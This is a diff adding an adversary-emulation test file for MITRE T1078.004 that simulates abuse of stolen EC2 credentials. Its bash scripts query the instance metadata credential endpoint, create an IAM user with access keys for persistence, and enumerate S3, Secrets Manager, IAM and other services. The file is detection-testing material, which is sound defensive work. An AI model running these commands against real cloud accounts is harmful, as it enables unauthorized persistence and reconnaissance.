@@ -1,0 +1,182 @@
+attack_technique: T1078.004
+display_name: "Valid Accounts: Cloud Accounts"
+atomic_tests:
+  - name: AWS IAM Privilege Escalation via Stolen EC2 Credentials
+    auto_generated_guid: c3d4e5f6-a7b8-4901-c234-56789abcdef3
+    description: |
+      Simulates an attacker using stolen EC2 instance credentials to perform IAM privilege escalation.
+      After stealing credentials from IMDS, attackers typically attempt to create new IAM users, attach policies,
+      or create access keys to establish persistence and escalate privileges.
+      
+      This test requires valid AWS credentials (from EC2 instance role) and will attempt to:
+      1. Create a new IAM user
+      2. Attach an administrative policy
+      3. Create access keys for persistence
+      
+      Detection: Should trigger "EC2 Instance Role Credential Abuse for IAM Privilege Escalation" rule.
+      
+      WARNING: This test performs actual AWS API calls. Only run in isolated test environments.
+    supported_platforms:
+      - linux
+      - macos
+    dependencies:
+      - description: AWS CLI must be installed
+        prereq_command: |
+          which aws
+        get_prereq_command: |
+          echo "Please install AWS CLI: https://aws.amazon.com/cli/"
+      - description: Must be running on EC2 instance with IAM role
+        prereq_command: |
+          curl -s -m 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ > /dev/null 2>&1 && echo "OK" || echo "FAIL"
+        get_prereq_command: |
+          echo "This test must run on an EC2 instance with an attached IAM role"
+    dependency_executor_name: bash
+    input_arguments:
+      test_user_name:
+        description: Name for the test IAM user to create
+        type: string
+        default: atomic-test-user-$(date +%s)
+      test_policy_arn:
+        description: Policy ARN to attach (use read-only for safety)
+        type: string
+        default: arn:aws:iam::aws:policy/ReadOnlyAccess
+    executor:
+      name: bash
+      elevation_required: false
+      command: |
+        echo "[*] Simulating IAM privilege escalation with stolen EC2 credentials..."
+        
+        # Store the test user name for cleanup
+        TEST_USER="#{test_user_name}"
+        echo $TEST_USER > /tmp/atomic_test_user.txt
+        
+        # Attempt to create IAM user
+        echo "[*] Attempting to create IAM user: $TEST_USER"
+        if aws iam create-user --user-name $TEST_USER 2>&1; then
+          echo "[+] Successfully created IAM user"
+          
+          # Attempt to attach policy
+          echo "[*] Attempting to attach policy to user"
+          if aws iam attach-user-policy --user-name $TEST_USER --policy-arn #{test_policy_arn} 2>&1; then
+            echo "[+] Successfully attached policy"
+          else
+            echo "[-] Failed to attach policy (may lack permissions)"
+          fi
+          
+          # Attempt to create access key
+          echo "[*] Attempting to create access key for persistence"
+          if aws iam create-access-key --user-name $TEST_USER 2>&1 | tee /tmp/atomic_access_key.json; then
+            echo "[+] Successfully created access key"
+            echo "[!] Privilege escalation simulation complete"
+          else
+            echo "[-] Failed to create access key"
+          fi
+        else
+          echo "[-] Failed to create IAM user (may lack permissions or user exists)"
+        fi
+      cleanup_command: |
+        echo "[*] Cleaning up IAM resources..."
+        
+        if [ -f /tmp/atomic_test_user.txt ]; then
+          TEST_USER=$(cat /tmp/atomic_test_user.txt)
+          
+          # Delete access keys
+          echo "[*] Deleting access keys..."
+          aws iam list-access-keys --user-name $TEST_USER --query 'AccessKeyMetadata[*].AccessKeyId' --output text 2>/dev/null | while read key; do
+            aws iam delete-access-key --user-name $TEST_USER --access-key-id $key 2>/dev/null
+          done
+          
+          # Detach policies
+          echo "[*] Detaching policies..."
+          aws iam list-attached-user-policies --user-name $TEST_USER --query 'AttachedPolicies[*].PolicyArn' --output text 2>/dev/null | while read policy; do
+            aws iam detach-user-policy --user-name $TEST_USER --policy-arn $policy 2>/dev/null
+          done
+          
+          # Delete user
+          echo "[*] Deleting IAM user..."
+          aws iam delete-user --user-name $TEST_USER 2>/dev/null
+          
+          # Cleanup temp files
+          rm -f /tmp/atomic_test_user.txt /tmp/atomic_access_key.json
+          echo "[+] Cleanup complete"
+        else
+          echo "[-] No cleanup needed - user was not created"
+        fi
+
+  - name: AWS Reconnaissance via Stolen EC2 Credentials
+    auto_generated_guid: d4e5f6a7-b8c9-4012-d345-6789abcdef04
+    description: |
+      Simulates an attacker using stolen EC2 instance credentials to perform reconnaissance across AWS services.
+      After obtaining credentials, attackers typically enumerate the environment to understand:
+      - Available EC2 instances and security groups
+      - S3 buckets and their contents
+      - RDS databases
+      - Secrets Manager secrets
+      - IAM users and roles
+      
+      This reconnaissance helps attackers identify valuable targets and plan their next moves.
+      
+      Detection: Should trigger "EC2 Instance Role Used for AWS Reconnaissance Activity" rule.
+      
+      WARNING: This test performs actual AWS API calls. Only run in isolated test environments.
+    supported_platforms:
+      - linux
+      - macos
+    dependencies:
+      - description: AWS CLI must be installed
+        prereq_command: |
+          which aws
+        get_prereq_command: |
+          echo "Please install AWS CLI: https://aws.amazon.com/cli/"
+      - description: Must be running on EC2 instance with IAM role
+        prereq_command: |
+          curl -s -m 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ > /dev/null 2>&1 && echo "OK" || echo "FAIL"
+        get_prereq_command: |
+          echo "This test must run on an EC2 instance with an attached IAM role"
+    dependency_executor_name: bash
+    input_arguments:
+      aws_region:
+        description: AWS region to perform reconnaissance in
+        type: string
+        default: us-east-1
+    executor:
+      name: bash
+      elevation_required: false
+      command: |
+        echo "[*] Starting AWS reconnaissance with stolen EC2 credentials..."
+        echo "[*] Target region: #{aws_region}"
+        
+        # EC2 Reconnaissance
+        echo "\n[*] Enumerating EC2 instances..."
+        aws ec2 describe-instances --region #{aws_region} --query 'Reservations[*].Instances[*].[InstanceId,State.Name,InstanceType]' --output table 2>&1 | head -20
+        
+        echo "\n[*] Enumerating security groups..."
+        aws ec2 describe-security-groups --region #{aws_region} --query 'SecurityGroups[*].[GroupId,GroupName]' --output table 2>&1 | head -20
+        
+        echo "\n[*] Enumerating security group rules..."
+        aws ec2 describe-security-group-rules --region #{aws_region} --query 'SecurityGroupRules[*].[GroupId,IpProtocol,FromPort,ToPort]' --output table 2>&1 | head -20
+        
+        # S3 Reconnaissance
+        echo "\n[*] Enumerating S3 buckets..."
+        aws s3 ls 2>&1 | head -20
+        
+        # RDS Reconnaissance
+        echo "\n[*] Enumerating RDS databases..."
+        aws rds describe-db-clusters --region #{aws_region} --query 'DBClusters[*].[DBClusterIdentifier,Engine,Status]' --output table 2>&1 | head -20
+        
+        # Secrets Manager Reconnaissance
+        echo "\n[*] Enumerating Secrets Manager secrets..."
+        aws secretsmanager list-secrets --region #{aws_region} --query 'SecretList[*].[Name,Description]' --output table 2>&1 | head -20
+        
+        # CloudWatch Logs Reconnaissance
+        echo "\n[*] Enumerating CloudWatch log groups..."
+        aws logs describe-log-groups --region #{aws_region} --query 'logGroups[*].[logGroupName]' --output table 2>&1 | head -20
+        
+        # IAM Reconnaissance
+        echo "\n[*] Enumerating IAM users..."
+        aws iam list-users --query 'Users[*].[UserName,CreateDate]' --output table 2>&1 | head -20
+        
+        echo "\n[!] Reconnaissance complete - multiple AWS services enumerated"
+      cleanup_command: |
+        # No cleanup needed - read-only reconnaissance operations
+        echo "[*] No cleanup required for read-only reconnaissance"
